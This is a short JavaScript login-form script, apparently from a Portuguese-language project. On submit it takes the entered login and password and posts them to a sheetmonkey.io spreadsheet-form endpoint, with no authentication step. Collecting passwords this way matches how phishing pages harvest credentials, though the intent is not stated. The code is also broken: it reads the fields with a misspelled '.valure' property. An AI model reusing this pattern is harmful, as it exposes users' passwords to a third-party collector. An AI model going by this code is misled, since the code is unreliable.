const enviar = document.querySelector("#submit")

enviar.addEventListener('click',(evento)=>{
    evento.preventDefault()
    
    const login = document.querySelector("#login").valure
    const senha = document.querySelector("#senha").valure

    fetch('https://api.sheetmonkey.io/form/kDAtwkbtrC6C5oQcremCsj',{
        method: "POST",
        headers: {
            "Accept": "application/json",
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            email: login,
            senha
        })
    })
})